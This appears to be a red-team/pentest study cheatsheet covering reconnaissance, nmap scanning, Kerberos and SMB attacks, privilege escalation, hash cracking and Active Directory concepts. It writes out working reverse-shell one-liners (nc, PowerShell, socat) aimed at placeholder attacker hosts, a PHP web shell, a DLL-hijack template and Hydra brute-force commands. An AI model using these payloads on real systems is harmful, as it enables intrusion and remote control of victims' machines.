# Red Team Cheatsheet

[Tib3rius Pentest Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets)
## 1. OSINT / Passive Reconnaissance
*Reconnaissance* is all about info gathering and can usually be done without directly interacting with the target(s) or any of their systems.

### Methodology
- [OSSTMM (Open Source Security Testing Methodology Manual) 3](https://www.isecom.org/OSSTMM.3.pdf)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [NCSC CAF (Cyber Assessment Framework)](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance)
- [Mozilla RRA (Rapid Risk Assessment)](https://infosec.mozilla.org/guidelines/risk/rapid_risk_assessment.html)

### Tools
- General Search
    - [Google](https://www.google.com) / [Google Dorking](https://exposingtheinvisible.org/guides/google-dorking/)
    - [Bing](https://www.bing.com)
    - [DuckDuckGo](https://www.duckduckgo.com)
    - [Internet Archive](https://archive.org/)
    - [Wikipedia](https://www.wikipedia.com)
    - [Yandex](https://yandex.ru)
- [PeopleFinder.com](https://www.PeopleFinder.com): person lookup, police records, background checks, social media etc.
- IP / DNS Records / Domains / Subdomain Search
    - [who.is](https://who.is): domain name search
        - [whois](https://linux.die.net/man/1/whois): CLI utility for `who.is`
    - [ipinfo](https://ipinfo.io/)
    - [nslookup](https://linux.die.net/man/1/nslookup): CLI to interactively query Internet name servers 
    - [dig](https://linux.die.net/man/1/dig): CLI DNS lookup utility
    - [dnsdumpster](https://dnsdumpster.com/): dns recon & research
    - [sublist3r](https://tools.kali.org/information-gathering/sublist3r): subdomain enumuration with OSINT
    - [Shodan](https://www.shodan.io/): open internet device search
    - [crt.sh](https://crt.sh): TLS certificate database
    - [threatcrowd](https://threatcrowd.org/)
    - [AbusedIPDB](https://www.abuseipdb.com/)
    - [Talos Reputation Center](https://talosintelligence.com/reputation_center/lookup)
- Email / Social Media
    - [hunter.io](https://hunter.io/): email search
    - [Namechk](https://namechk.com/): social media username lookup
    - [Lookup ID](https://lookup-id.com/): Facebook profile lookup
- Images Search and Data Extraction
    - [TinEye](https://tineye.com/): reverse image search
    - [exiftool](https://exiftool.org/): image metadata extractor 
- Maps / GPS / Location
    - [Google Maps](https://maps.google.com/)
    - [Map Customizer](https://www.mapcustomizer.com/)
    - [wigle.net](https://wigle.net): catalog of wireless networks
- Web
    - [Wappalyzer](https://www.wappalyzer.com/): website stack profiler
    - [builtwith.io](https://builtwith.com/): website stack profiler
    - [OWASP favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
    - [grep.app](https://grep.app/): search Github with grep, can be used to find exposed api keys, passwords etc.
- Knowledge Organization
    - [Maltego](https://www.maltego.com/): graphical link analysis tool for gathering and connecting information
    - [Obisdian](https://obsidian.md/): markdown editor
    
## 2. Scanning / Active Reconnaissance
*Enumeration* is necessary to map out the overall *attack surface* of the target(s).

### Tools
- [ping](https://www.computerhope.com/unix/uping.htm): ICMP network probe
- [telnet](https://www.computerhope.com/jargon/t/telnet.htm): utility for interactive sessions over the TELNET
- [traceroute](https://www.computerhope.com/unix/utracero.htm): find network route taken by packets
- [netcat (nc)](https://www.linuxfordevices.com/tutorials/netcat-command-in-linux): network Swiss army knife
- [arp-scan](http://www.royhills.co.uk/wiki/index.php/Arp-scan_User_Guide): network scanner using ARP
- [masscan](https://danielmiessler.com/study/masscan/): fast IP port scanner 
- [nmap](https://nmap.org/)
    ```bash
    # Note <host> can be replaced with any IP in standard CIDR notation
    # e.g. 192.168.1.0/24

    # Host discovery
    nmap -sL <host> # list all IPs in the provided range, this also performs a reverse 
                    # DNS lookup
    nmap -PN <host> # skip initial ping check to scan hosts that ignore ping
    nmap -PS <host> # TCP SYN ping
    nmap -PA <host> # TCP ACK ping
    nmap -PU <host> # UDP ping
    nmap -PE <host> # ICMP ping echo (code 8)
    nmap -PP <host> # ICMP ping timestamp (code 14)
    nmap -PM <host> # ICMP ping address mask (code 18)

    # Port scanning
    nmap -sn <host> # Ping scan (disables port scan)
    nmap -sT <host> # TCP scan
    nmap -sU <host> # UDP scan
    nmap -sN <host> # TCP NULL scan: all flags are set to 0
    nmap -sF <host> # TCP FIN scan: FIN flag set to 1
    nmap -sX <host> # TCP Xmas scan: FIN, PSH, and URG flags set to 1
    nmap -sM <host> # TCP Maimon scan: FIN, and ACK flags set to 1, not very useful
                    # against modern networks
    nmap -sA <host> # TCP ACK scan: ACK flag set to 1, helpful if there is a firewall
                    # in front of the target
    nmap -sW <host> # Window scan: like ACK scan, but also examines the TCP Window field
                    # of the RST packets returned which reveals if the port is open
    nmap -sS <host> # TCP SYN scan: SYN flag set to 1
    nmap --scanflags <custom-flags> <host> # Custom scan: create custom flag scan

    # Spoofing / Decoys
    nmap -S <spoofed-ip> <host> # scan with an apparent source of <spoofed-ip>
    nmap -D <decoys>,ME <host>  # launch decoy scans from  the provided list of decoy IPs
    nmap -sI <zombie-ip> <host> # Idle/Zombie scan, makes each probe appear to originate
                                # from the idle/zombie host

    # Other options
    nmap --script=vuln <host> # enumerate host for known vulnerabilities
    nmap -Ap <host>     # Agressive, enables OS and version detection,
                        # script scanning, and traceroute across all ports
    nmap -F <host>      # Fast scan (only top 100 instead of 1000)
    nmap -f <host>      # fragment packets into 8 bytes or less
    nmap -ff            # fragment packets into 16 bytes or less
    nmap --mtu          # change default (8) fragment size value
    nmap --data-length  # pad packets to given length (can appear more innocuous than
                        # empty packets)
    nmap --reason       # display the reason a port is in a particular state
    nmap -v             # verbose output
    nmap -vv            # more verbosity
    nmap -d             # debugging details
    nmap -dd            # more debugging details

    # Output options
    nmap -oN <file>     # output normal format
    nmap -oG <file>     # output greppable format
    nmap -oX <file>     # output XML format

    # Post port scan
    nmap -sV            # probe ports to detect running services and versions
    nmap -O             # OS detection (not always accurate)
    nmap --traceroute   # add traceroute to results

    # NSE (Nmap Scripting Engine)
    # Downloaded scripts can be found at `/usr/share/nmap/scripts` 
    nmap --script=default   # enable scripts in the `default` category
    nmap --script=name      # enable given script
    nmap -sC                # shorthand to enable scripts in the `default` category
    
    
    # Typical scans
    nmap -v -sV -sC -oN nmap <host> # scan top 1000 ports including version checks
                                    # and standard scripts and output to nmap file
    nmap -v -sV -sC -oN nmapAll <host> -p-  # same as above, but scan all ports and
                                            # output to nmapAll file
    ```
    - [NSE (Nmap Scripting Engine)](https://nmap.org/book/man-nse.html)
	- Don't forget to lookup `nmap` script, there are many available for finding vulns and enumerating a host for many service
- [dnsrecon](https://pentestlab.blog/2012/11/13/dns-reconnaissance-dnsrecon/)
- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
- [metasploit](https://www.metasploit.com/): DB of easily searchable and configurable exploits
- SMB Enum
    - [smbmap](https://tools.kali.org/information-gathering/smbmap): enumerate smb shares
    - [smbtree](https://linux.die.net/man/1/smbtree)
    - [smbclient](https://linux.die.net/man/1/smbclient)
        ```bash
        smbclient -L <host> # list shares/devices available over smb
        ```
    - nmap scripts
        ```bash
        # Catchall nmap SMB enum scan
        nmap -d --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -o nmapSMB -p445 <host>

        ```
- Fuzzing / Web Domain Enumeration
    - [dirb](https://tools.kali.org/web-applications/dirb): enum web directories/files
    - [dirbuster](https://tools.kali.org/web-applications/dirbuster): enum web directories/files
    - [gobuster](https://github.com/OJ/gobuster): enum web directories/files
    - [wfuzz](https://wfuzz.readthedocs.io/en/latest/): web app bruteforcer
    - [ffuf (Fuzz Faster U Fool)](https://github.com/ffuf/ffuf): a fast web fuzzer written in Go
- [AutoRecon](https://github.com/Tib3rius/AutoRecon): network recon tool which performs automated enumeration of services 
- Web Proxies
    - [Burpe Suite](https://www.metasploit.com/): capture and mod HTTP requests
    - [ZAP](https://www.zaproxy.org/getting-started/): capture HTTP requests, web fuzzing

### Subdomain Enumeration
- OSINT
    - SSL/TLS Certificates: [crt.sh](https://crt.sh): certificate database
    - Search Engines: Google example: `-site:www.domain.com site:*.domain.com`
- Brute force: e.g. gobuster, ffuf, sublist3r etc. to find subdomains or virtualhosts

### Tips / Tricks
- Websites / Webservers
    - Enumerate web directories/files with a tool like gobuster, ffuf, etc.
    - when enumerating a website, if you find hidden directories not picked up by yoru fuzzer, don't forget to rerun them with the new base directory. E.g. gobuster and ffuf don't recurse automatically.

## 3. Exploitation / Gaining Access
Never jump to the *exploitation* phase too early. You __must__ perform adequate *reconnaissance* and *enumeration*.

### Exploit/CVE Research Tools
- [Mitre CVE](https://cve.mitre.org/)
- [CVE Details](https://www.cvedetails.com/)
- [NVD](https://nvd.nist.gov/vuln/search)
- [Exploit-DB](https://www.exploit-db.com/)
- [Rapid7](https://www.rapid7.com/db/)
- [searchsploit](https://www.exploit-db.com/searchsploit): searches [exploit.db](https://exploit.db)

### Tools
- [Metasploit Notes](metasploit.md) / [Metasploit](https://docs.rapid7.com/metasploit/)
- Reverse / Bind Shells Payloads
    - [netcat/nc](https://www.unix.com/man-page/Linux/1/netcat): network Swiss Army knife
    - [ncat](https://nmap.org/ncat/guide/index.html): replacement for netcat from 
    - [Socat](https://linux.die.net/man/1/socat): bidirectional byte stream handler, useful for more stable reverse & bind shells
    - [Reverse Shell Generator](https://www.revshells.com/)
    - [pentestmonkey](http://pentestmonkey.net/)
    - [msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
    - [ASMI.fail](https://amsi.fail/): obfuscated powershell snippets. ASMI = Anti-Malware Scan Interface
    - [ScareCrow](https://github.com/optiv/ScareCrow): payload creation framework designed for EDR bypass

- Phishing
    - [Gophish](https://getgophish.com/): 
- [impacket](https://github.com/SecureAuthCorp/impacket): set of python classes for interacting with network protocols
- [scapy](https://github.com/secdev/scapy): interacdtive packet crafter
- [bettercap](https://www.bettercap.org/): Swiss Army knife for WifFi, Bluetooth, etc. network recon and MITM attacks

    
### [Web Exploitation](web.md)
----

### [Binary Exploitation](./binary_exploitation)
----

### Network Services
#### Telnet
#### SMB (Server Message Blocks)
- `enum4linux-ng`, `smclient`
#### FTP / SFTP
- `ftp`
    - If you ever download file via FTP, may need to use the `binary` command, which sets the transfer type and supports binary images (default is `ascii`).
#### [Kerberos](https://docstore.mik.ua/orelly/networking_2ndEd/fire/ch21_05.htm)
Kerberos is the default authentication services for Windows domains. [Kerberos Auth 101](https://redmondmag.com/articles/2012/02/01/understanding-the-essentials-of-the-kerberos-protocol.aspx)
- Terms
    - Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
    - Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
    - Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
    - Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
    - Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
    - KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
    - Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
    - Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
    - Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
    - Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
- Attack Methods	
    - Kerbrute Enumeration - No domain access required 
    - Pass the Ticket - Access as a user to the domain required
    - Kerberoasting - Access as any user required
        ```powershell
        setspn-T medin -Q */*  # extract all accounts in the SPN (Service Principal Name)
         ```
    - AS-REP Roasting - Access as any user required. Kerberos attack method for when a user account has the "Does not require Pre-Authentication" privilege set, so the account doesn't need to provide valid identification before requesting a Kerberos ticket
        - Use Impacket `GetNPUsers.py` to query ASREPRoastable accounts from the Key Distribution Center. You just need a valid set of usernames.
    - Golden Ticket - Full domain compromise (domain admin) required 
    - Silver Ticket - Service hash required 
    - Skeleton Key - Full domain compromise (domain admin) required
- Tools
    - [Kerbrute](https://github.com/ropnop/kerbrute): tool for Kerberos pre-auth bruteforcing
    - [Rubeos](https://github.com/GhostPack/Rubeus): a C# toolset for raw Kerberos interaction and abuses
    - [Impacket](https://github.com/SecureAuthCorp/impacket): Impacket GetNPUsers.py
- ASREPRoasting: 
- Pass the Ticket w/mimikatz: dump the TGT from LSASS memory
- Golder/Silver Ticcket Attacks w/mimikatz
#### NFS
- `showmount e <host>` - shows mount info for an NFS server
- mount the NFS share with `sudo mount -t nfs <IP>:<SHARE> /mount/location`
#### SMTP
- enumerate with nmap script or metasploit (auxiliary/scanner/smtp/smtp-enum)
#### MySQL
- enumerate with nmap script or metasploit (auxiliary/scanner/mysql)
#### Git
- [GitTools](https://github.com/internetwache/GitTools): scripts for pwning .git repos

#### Shells
- Stabilize shell with python: `python -c 'import pty;pty.spawn("/bin/bash")'` to run a bash shell
- Get stable bind or reverse shell
    1. Python 
        ```bash
        python -c 'import pty;pty.spawn("/bin/bash")' # spawn bash shell
        export TERM=xterm # get access to term command like `clear`
        stty raw -echo; fg # turns off terminal echo (so we get tab autocomplete, arrow keys, and Ctrl + C) 
        # NOTE if the shell dies, we won't get any terminal echo since we disabled it
        # type `reset` to fix that
        ```
    2. rlwrap: gives access to history, tab completion, and arrow keys. Particularly useful for Windows shells.
        ```bash
        rlwrap nc -lvnp <port>
        stty raw -echo; fg # to completely stabilise
        ```
    3. Socat
        - initial access with `nc`. Download socat static compiled binary.
        - Reverse shells
            - Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
                - The _pipes_ options is used to force powershell or cmd.exe to use Unix style STDIO
            - Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash-li"`
        - Bind shells
            - Windows: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
            - Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
        - connect to listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
        - Stable linux reverse shell with tty
            ```bash
            # listener
            socat TCP-L:<port> FILE:`tty`,raw,echo=0
            # connect to listener
            socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
            ```
        - Socat encrypted shell
            ```bash
            # generate cert for encrypted shell
            openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
            # merge key and cert into .pem
            cat shell.key shell.crt > shell.pem

            # reverse shell setup listener
            socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - 
            # NOTE: the cert MUST be used on the listening device
            # connect back to listener 
            socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

            # bind shell setup listener
            socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
            # connect back to listener
            socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
            ```
        - Common shell payloads
            ```bash
            # Linux listener for bind shell
            mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
            # Linux reverse shell
            mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
            ```
            ```powershell
            # Powershell reverse shell oneliner
            powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            ```
- Web Shells
    - PHP
        ```php
        <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
        ```
- Configure terminal tty size to use a text editor
    ```bash
    stty -a # list tty settings
    stty rows <number> # set to row output from stty -a
    stty cols <number> # set to col output from stty -a
    ```
- See `/usr/share/webshells` for webshells available on default Kali
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [Poison null byte](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)


## 4. Privilege Escalation (Priv Esc)
### Windows
#### Automated Tools
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt): C# project that performs "safety checks" on a Windows host
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng): python script that 
- Metaspoit module `multi/recon/local_exploit_suggester`: list vulnerabilities for the target system

#### Manual Enum
- `C:\Windows\Temp`: world writeable temp directory
- `C:\Program Files (x86)\SystemScheduler\Events`: windows scheduled services event logs
- `C:\Windows\System32\drivers\etc\hosts`: /etc/hosts for Windows
- Info
    - `whoami /priv`: list all privileges
    - `hostname`: show hostname
    - `net users`: list users
    - `net users <username>`: list details of username
    - `net localgroup`: list user groups defined on the system
    - `net localgroup <groupname>`: list member of a group
    - `query session`: show other users logged in simultaneously
    - `sc query`: lists running services
    - `sc query <service`: get information on service
    - `wevtutil`: retrieve info about event logs and publishers
    - `systeminfo`: return overview of target system
- Files / Search
    - `findstr`: cmd grep
    - `findstr /si password *.txt`: recursively search the current directory for .txt files with the name "password" ignoring case
- Windows Updates
    - `wmic qfe get Caption,Description,HotFixID,InstalledOn`: list updates installed on the system
- Scheduled Tasks
    - `schtasks /query /fo LIST /v`: list scheduled tasks
    - Look for tasks with lost binaries or binaries you can edit
- Drivers
    - `driverquery`: list available drivers
        - drivers are less frequently updated and may present a vulnerability
- Software / Services
    - `wmic product get name,version,vendor`: list installed software (may not return all installed programs)
    - `wmic service list brief`: list running services
    - `wmic service get name,displayname,pathname,startmode`: list running services
    - `netstat -ano`: list al listening ports
        - can try port forwarding any ports that are unreachable from the outside as another potential vector
- AV
    - `sc query windefend`: return state of Windows Defender service (windefend)
    - `sc queryx type=service`: ???
- Powershell
    - `powershell.exe -nop -exec bypass`: launch powershell without execution policy restrictions
- DLL Hijacking: manipulating a DLL used by an aplication
    - Use `ProcMon` to find application with missing DLLs (with NAME NOT FOUND error). NOTE this type of research will need to be done on lab box sinceadmin is required to run `ProcMon`
    - Example minimal DLL file:
    ```c
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```
    - Command to compile above dll with MinGW: `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`
    - `sc stop dllsvc & sc start dllsvc`: restart the dllsvc service
- Unquoted Service Path: when a service binary path is not "quoted"
    - this can be exploited if we can write to a folder on the path and are able to restart the service
- Token Impersonation ("Potato" series of series of exploits often refer to this kind of vuln)
- Files / Password
    - cleartext password files
    - config files
    - registry keys
        - `reg query HKLM / password /t REG_SZ /s`: search registries possibly containing passwords
        - `reg query HKCU / password /t REG_SZ /s`: search registries possibly containing passwords
    - `cmdkey /list`: list saved users' credentials
    - `unattend.xml`: used for setup by sysadmins, shoudl normally be deleted after setup

#### App Locker
App Locker is an application allowlisting technology introduced with Windows 7
- Bypass
    - The default `AppLocker` configuration allowes applications to be executed from `C:\Windows\System32\spool\drivers\color`


### Linux
#### Automated Tools
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LSE (Linux Smart Enumeration)](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux PrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
- [pspy](https://github.com/DominicBreuker/pspy/): monitor processes w/o root permissions

#### Manual Enum
1. General System Info / Environment
    - `id`: print real and effect user and group IDs
    - `hostname`: may reveal target system's role within the network
    - `uname -a`: additional system info such as hostname, kernel version, distribution
    - `/etc/issue`: contains OS info (can be easily changed though)
    - `/proc/version`: kernel version
    - The `proc` filesystem (`procfs`) is a commonly installed on Linux contains useful information on the system processes
1. User Info
    - `env`: list current environment variables
        - pay particular attention to the `PATH` and `shell`
    - History Files
    - Config Files
        - `~/.bashrc`: bash config
        - `~/.ssh`: ssh keys
    
1. Processes (CHECK WHAT THE SYSTEM IS RUNNING)
    - `ps -A` or `ps -e` to view all processes
    - `ps -eo euser,ruser,suser,fuser,f,comm,label`: get security info
    - `ps -U root -u root u`: see every process running as root
        - Search for services such as `mysql`,`postgres`,`tmux` etc. running as root
        - Consider searching by processes run by particular users or groups
1. Sudo / SUID / SGID / Executables / Weak File Permissions
    - [gtfobins](https://gtfobins.github.io/)
    - `sudo -l`: list sudo permissions for current user
    - `find / -type f -perm -u+s 2>/dev/null`: find all suid files
    - `find / -type f -perm -g+s 2>/dev/null`: find all guid files
    - `find / -type f -perm 0777 2>/dev/null`: find all files with 777 permissions
    - `find / -writable -type d 2>/dev/null`: find world writable folders
    - `find / -writable -type f 2>/dev/null`: find world writable files
    - `find / -perm -o=w -type d 2>/dev/null`: find world writable folders
    - `find / -perm -o=x -type f 2>/dev/null`: find executable files
    - `find / -type f -user www-data 2>/dev/null`: find all files owned by user www-data
    - readable /etc/shadow
    - [shared object injection](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) using `LD_PRELOAD`
    - abusing shell features
1. Recent files
    - `find / -mtime 10 2>/dev/null`: find files modified in the last 10 days
    - `find / -atime 10 2>/dev/null`: find files accessed in the last 10 days
    - `find / -ctime 60 2>/dev/null`: find files changed in the last 10 days
    - `getcap -r / 2>/dev/null`: list enabled capabilities
1. Cron
    - `/etc/crontab`: system cronjobs
    - File Permissions
    - PATH Environment Variable: you can plant a script if the you can write to a directory in the path, and the cronjob doesn't specify a full path or uses a wildcard `*`
1. Storage
    - Store enum scripts, exploits, etc.  in `/tmp/` or `/dev/shm/`
    - Shell Escape Sequences
1. NFS
    - `showmount -e <host>`: show NFS server's export list
    - `/etc/exports`: NFS config check for _root_squashing_
1. Kernel Exploits
1. Priv Esc Scripts
1. [Restricted Shells](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
1. [Write your own shell code](https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/)

### Docker / VMs
- [deepce](https://github.com/stealthcopter/deepce)

## 5. Post Exploitation
### Passwords / Cracking Hashes / Bypassing Auth
- [Hydra](https://en.kali.tools/?p=220)
    ```bash
    # General usage
    hydra -L <userlist.txt> -P <passwordlist.txt> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"
    # Example wordpress password reset fuzzing
    hydra -I -L /usr/share/seclists/Usernames/Names/names.txt -p "password" internal.thm http-post-form "/blog/wp-login.php?action=lostpassword:user_login=^USER^&redirect_to=&wp-submit=Get+New+Password:F=There is no account with that username or email address."
    ```
- [John the Ripper](https://openwall.info/wiki/john)
    ```bash
    # crack hashes and show results
    john --format=<format> --show hashes.txt 

    ssh2john
    ```
- [secretsdump.py](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)
- [hashcat](https://hashcat.net/hashcat/): CPU and GPU enabled hashcracking tool
- [crackstation.com](https://crackstation.net/): online hash identifier and hashcracking tool using popular rainbow tables
- [hashes.com](https://hashes.com/en/decrypt/hash)
- [unshadow](https://www.commandlinux.com/man-page/man8/unshadow.8.html)
- [CrackMapExec](https://ptestmethod.readthedocs.io/en/latest/cme.html)
- [gosecretdump](https://github.com/C-Sto/gosecretsdump)
- [Hashes.com](https://hashes.com/en/tools/hash_identifier)
- [hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master)
- [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
- [CyberChef](https://0x1.gitlab.io/code/CyberChef/)
- [DPAT (Domain Password Audit Tool)](https://github.com/clr2of8/DPAT): generates a report of password use stats from a hash dump
- [Responder](https://github.com/lgandx/Responder): LLMNR, NBT-NS and MDNS poisoner

### Powershell Empire
- [Powerview 3.0](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)


## 6. Pivoting / Proxies
### Tools
- [SSH Tunnels & Procies](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6?gi=a1c24efda869)
- [Proxychains](https://github.com/haad/proxychains)
- [sshuttle](https://sshuttle.readthedocs.io/en/stable/)

## 7. Covering Tracks / Cleanup
Rules of any engagment should be agreed to prior to the penetration test.
Take exhaustive notes to assist IT/system owner in cleanup and remediation.

### Tools
- [LOLBAS (Living Off the Land Binaries And Scripts)](https://lolbas-project.github.io/#)

## 8. Reporting
Provide a *full format report* along with a breakdown including *remediation recommendations*.

[SANS Rules of Engagement Sample](https://sansorg.egnyte.com/dl/bF4I3yCcnt/?)

### Templates
- [OSCP Exam Report Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)

----
# Linux

# Windows
- How to `scp` files to/from a Windows machine
    ```bash
    ```

## Powershell
- [Nishang](https://github.com/samratashok/nishang): powershell offensive scripts and payloads

## Active Directory (AD)
*Active Directory* (AD) is the directory service for Windows Domain Networks. AD allows for control and monitoring of all a companies users through a single *domain controller*. It allows a single user to sign into any computer on the AD network.

- Domain Controller: holds the `AD DS data store` and allows admin access to domain resources.
- AD DS (Domain Services) Data Store
	- `NTDS.dit`: a database of all the AD domain controller info such as password hashes for domain users. By default the `NTDS.dit` is stored in `%SystemRoot%\NTDS` and only accessible by the domain controller.
- Forests, Trees, Domains
	- Forest: a collection of one or more domain trees in an AD network
		- Trees - A hierarchy of domains in Active Directory Domain Services
		- Domains - Used to group and manage objects 
		- Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
		- Trusts - Allows users to access resources in other domains
		- Objects - users, groups, printers, computers, shares
		- Domain Services - DNS Server, LLMNR, IPv6
		- Domain Schema - Rules for object creation
- Users
	- Domain Admins: the big boss, only ones with access to the domain controller.
	- Service Accounts (can also be Domain Admins) these mostly aren't used except for service maintenance.
	- Local Admins: these users can make changes on local machines as admin but __cannot__ access the domain controller.
	- Domain users: everyday users, may have local admin to machines to machinens they have access to. 
- Groups
	- Security Groups: these groups can specify permissions for many users
	- Default Security Groups
		- Domain Controllers: all domain controllers in the domain
		- Domain Guests: all domain guests
		- Domain User: all domain users
		- Domain Computers: all workstations and servers joined to the domain
		- Domain Admins: designated admins of the domain
		- Enterprise Admins: designated admins of the enterprise
		- Schema Admins: designated admins of the schema
		- DNS Admins: 
		- DNS Update Proxy: DNS clients who are permitted to perform dynamic updates on behalf of some othe rclients (such as DHCP servers)
		- Allowed RODC Password Replication Group: members can have their passwords replicated to all read-only domain ccontrollers in the domain
		- Group Policy Creator Owners: members can modify group policy for the domain
		- Denied RODC Password Replication Group: members cannot have their passwords replicated to any read-only domain controllers in the domain
		- Protected users: members are affored additional protections against authentication security threats.
		- Cert Publishers: members are permitted to publish certificates to the directory
		- Enterprise Read-Only Domain Controllers: members ccan perform admin actions on key objects within the forest
		- Cloneable Domain Controllers: members that are domain controllers can be cloned
		- RAS and IAS Servers: servers in this group can access remote access properties of users
	- Distribution Groups: these groups can specify email distribution lists.
- Trusts: a mechanism for users in the network to gain access to other resources in the domain. Mostly truts outline the way domains inside a forest communicate with each other.
	- Directional Trusts: the direction of the trust flows from a *trusting* domain to a *trusted* domain
	- Transitive: the trust relationship expands beyond just two domains to include to include other trusted domains	
- Policies: dictate how the server operates and what rules it will or won't follow. These rules apply to the entire domain.
- Domain Services + Auth
    - *Domain Services* are just services the domain controller provides to the rest of the domain or tree.
    - Default Domain Services
		- LDAP (Lightweigth Directory Access Protocol): provides communication between applications and directory services
		- Certificate Services: allows the domain controller to create, validate and revoke public key certificates
		- DNS, LLMNR, NBT-NS: domain name services for identifying IP hostnames
	- Authentication: The most important and vulnerable part of AD. Two type: NTLM and Kerberos. 
		- NTLM: default Windows auth protocol uses an encrypted challenge/response
		- Kerberos: default auth service for AD, uses ticket-granting tickets and service tickets to authenticate users
- Azure (AD in the Cloud)

	|Windows Server AD|Azure AD
	|---|---
	|LDAP|Rest APIs
	|NTLM|OAuth/SAML
	|Kerberos|OpenID
	|OU Tree|Flat Structure
	|Domains and Forests|Tenants
	|Trusts|Guests


## Auth / LSASS.exe
- [NTLM Relay](https://en.hackndo.com/ntlm-relay/)
- [Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
	- Primary Access Tokens: token associated with a user account generated at log on
	- Impersonation Tokens: token that allows a particular process (or thread) to gain access to resources using the token of another user/client process. These tokens have levels.
		1. SecurityAnonymous: current user/client can't impersonate another user/client
		2. SecurityIdentification: current user/cclient can get the ID and privileges of a client, but cannot impersonate the client
		3. SecurityImpersonation: current user/client can impersonate the client's security context on the local system
		4. SecurityDelegation: current user/client can impersonate the client's security context on a remote system
	- user SIDs (security identifier)
	- group SIDs
	- privileges

## Useful File Locations
- `C:\windows\system32\drivers\etc\hosts`: equivalent of linux `/etc/hosts` file

## Kali / Attack Box
- Windows binaries in `/usr/share/windows-resources/binaries`

